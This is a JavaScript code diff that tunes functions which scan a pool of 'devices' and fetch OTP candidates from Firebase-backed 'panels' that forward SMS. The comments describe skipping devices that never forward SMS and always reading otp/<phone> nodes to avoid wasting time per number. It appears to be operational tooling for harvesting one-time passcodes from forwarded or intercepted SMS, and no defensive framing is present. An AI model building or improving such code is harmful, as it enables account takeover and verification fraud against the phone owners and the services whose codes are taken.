@@ -511,6 +511,12 @@ export async function scanFreshDevices(source, entries = [], opts = {}) {
   const earlyWidenStepMs = Math.max(0, Number(opts.earlyWidenStepMs) || 0);
   const maxScanMs = Math.max(0, Number(opts.maxScanMs) || 0);
   const onlineFallback = Boolean(opts.onlineFallback);
+  // Devices known to never forward SMS to Firebase (learned from OTP timeouts).
+  // Skipping them up-front is the difference between "3 fresh candidates from 1
+  // dead panel" and actually walking the pool.
+  const skipDevices = opts.skipDevices instanceof Set
+    ? opts.skipDevices
+    : new Set(Array.isArray(opts.skipDevices) ? opts.skipDevices : []);
   const probe = typeof opts.probe === 'function' ? opts.probe : null;
   const fetchImpl = opts.fetchImpl || fetch;
   const onProgress = typeof opts.onProgress === 'function' ? opts.onProgress : null;
@@ -524,6 +530,7 @@ export async function scanFreshDevices(source, entries = [], opts = {}) {
   const byDevice = new Map();
   for (const e of entries || []) {
     if (!e?.deviceId) continue;
+    if (skipDevices.has(e.deviceId)) continue;
     if (!byDevice.has(e.deviceId)) byDevice.set(e.deviceId, []);
     byDevice.get(e.deviceId).push(e);
   }
@@ -770,7 +777,6 @@ export async function fetchOtpCandidates(source, phone, { deviceIds = [], fetchI
   const needLegacy = Boolean(includeLegacy) || forcedLegacy;
 
   // 1. Primary: device messages/<deviceId>
-  let anyDeviceNodeFound = false;
   if (devIds.length) {
     const deviceNodes = await Promise.all(devIds.map(async (deviceId) => {
       try {
@@ -790,7 +796,6 @@ export async function fetchOtpCandidates(source, phone, { deviceIds = [], fetchI
 
     for (const [deviceId, node] of deviceNodes) {
       if (!node) continue;
-      anyDeviceNodeFound = true;
       const entries = Array.isArray(node)
         ? node.map((m, i) => [i, m])
         : (typeof node === 'object' ? Object.entries(node) : []);
@@ -800,9 +805,11 @@ export async function fetchOtpCandidates(source, phone, { deviceIds = [], fetchI
         if (c) out.push(c);
       }
     }
-    if (anyDeviceNodeFound && !needLegacy) {
-      return out;
-    }
+    // NOTE: do NOT return early when a device node exists. Plenty of panels
+    // write the OTP only to otp/<phone> and leave messages/<deviceId> with old
+    // SMS — returning here made those DBs look like pure "otp_timeout" panels
+    // and burned 60s per number. We always fall through to the otp/ fast path
+    // (only the legacy sms/ scan is skipped when device nodes were found).
   }
 
   // 2 & 3. Fast path (otp/<variant>) + legacy (sms/<variant>) in parallel
